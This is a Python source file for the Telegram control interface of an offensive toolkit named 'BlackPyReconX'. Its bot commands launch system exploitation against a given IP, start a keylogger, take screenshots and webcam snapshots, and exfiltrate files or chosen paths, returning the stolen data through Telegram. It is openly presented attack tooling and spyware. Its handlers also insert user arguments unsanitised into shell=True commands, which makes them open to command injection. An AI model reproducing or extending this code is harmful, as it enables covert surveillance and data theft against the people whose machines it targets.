import os
import subprocess
from pathlib import Path
from telegram import Update, InputFile
from telegram.ext import ContextTypes

from modules.utils import get_api_keys

# === Clés API ===
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise EnvironmentError("❌ TELEGRAM_BOT_TOKEN est manquant dans .env")

# === Répertoires ===
BASE_DIR = Path(__file__).resolve().parent.parent
OUTPUTS = BASE_DIR / "outputs"
SCREENSHOTS = OUTPUTS / "screenshots"

# === Commandes ===

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_reply(update, context, text=(
        "🕷️ *BlackPyReconX* - Menu des commandes :\n\n"
        "🔍 `/osint <ip|domaine>`\n"
        "🛠️ `/scan <ip>`\n"
        "💥 `/exploit_sys <ip>`\n"
        "📸 `/screenshot`\n"
        "🎹 `/keylogger_start`\n"
        "📷 `/webcam_snap`\n"
        "📤 `/exfiltrate`\n"
        "📂 `/exfiltrate_path <chemin>`\n"
        "🧾 `/rapport`\n"
    ), markdown=True)

async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await safe_reply(update, context, "❗ Usage : /osint <ip ou domaine>")
    cible = context.args[0]
    subprocess.run(f"python main.py --target {cible} --osint", shell=True)
    await safe_send_document(update, context, OUTPUTS / "osint.txt")

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await safe_reply(update, context, "❗ Usage : /scan <ip>")
    cible = context.args[0]
    subprocess.run(f"python main.py --target {cible} --scan", shell=True)
    await safe_send_document(update, context, OUTPUTS / "scan_results.txt")

async def exploit_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await safe_reply(update, context, "❗ Usage : /exploit_sys <ip>")
    cible = context.args[0]
    subprocess.run(f"python main.py --target {cible} --exploit_sys", shell=True)
    await safe_reply(update, context, "✅ Exploitation système lancée.")

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    subprocess.run("python modules/exploit_sys.py --screenshot", shell=True)
    await safe_send_document(update, context, SCREENSHOTS / "screenshot_latest.png", fallback="❌ Aucune capture trouvée.")

async def keylogger_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    subprocess.run("python modules/exploit_sys.py --keylogger", shell=True)
    await safe_reply(update, context, "🎹 Keylogger démarré.")

async def webcam_snap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    subprocess.run("python modules/exploit_sys.py --webcam", shell=True)
    await safe_send_document(update, context, SCREENSHOTS / "webcam_latest.png", fallback="❌ Aucune image webcam trouvée.")

async def exfiltrate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    subprocess.run("python main.py --exfil", shell=True)
    await safe_send_document(update, context, OUTPUTS / "exfiltrated.zip", fallback="❌ Aucune archive exfiltrée trouvée.")

async def exfiltrate_path(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await safe_reply(update, context, "❗ Usage : /exfiltrate_path <chemin>")
    chemin = " ".join(context.args)
    subprocess.run(f"python main.py --exfiltrate_path \"{chemin}\"", shell=True)
    await safe_reply(update, context, f"📂 Exfiltration de `{chemin}` terminée.", markdown=True)

async def rapport(update: Update, context: ContextTypes.DEFAULT_TYPE):
    subprocess.run("python modules/reporting.py", shell=True)
    await safe_send_document(update, context, OUTPUTS / "rapport_final.txt", fallback="❌ Rapport introuvable.")

# === Fonctions utilitaires protégées ===

async def safe_reply(update, context, text, markdown=False):
    try:
        await update.message.reply_text(
            text,
            parse_mode="Markdown" if markdown else None
        )
    except Exception as e:
        print(f"❌ Erreur en reply : {e}")

async def safe_send_document(update, context, path, fallback=None):
    try:
        if Path(path).exists():
            await update.message.reply_document(InputFile(path))
        elif fallback:
            await update.message.reply_text(fallback)
    except Exception as e:
        print(f"❌ Erreur envoi document : {e}")
